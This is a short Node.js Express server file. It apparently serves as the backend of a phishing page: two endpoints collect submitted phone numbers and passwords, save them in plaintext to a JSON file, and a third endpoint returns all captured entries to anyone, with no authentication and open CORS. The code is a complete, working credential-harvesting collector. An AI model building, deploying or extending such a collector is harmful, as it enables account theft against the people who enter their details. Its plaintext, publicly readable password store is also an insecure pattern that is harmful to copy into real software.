const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const DATA_FILE = path.join(__dirname, "data.json");
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, "[]");
}

function saveEntry(entry) {
  let arr = [];
  try {
    arr = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch {}
  arr.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

app.post("/save-phone", (req, res) => {
  saveEntry({
    type: "phone",
    phone: req.body.phone || "",
    time: new Date().toISOString()
  });
  res.json({ ok: true });
});

app.post("/save-password", (req, res) => {
  saveEntry({
    type: "password",
    password: req.body.password || "",
    time: new Date().toISOString()
  });
  res.json({ ok: true });
});

app.get("/api/logs", (req, res) => {
  try {
    const arr = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
    res.json(arr);
  } catch {
    res.json([]);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🔥 Server is running on port", PORT));
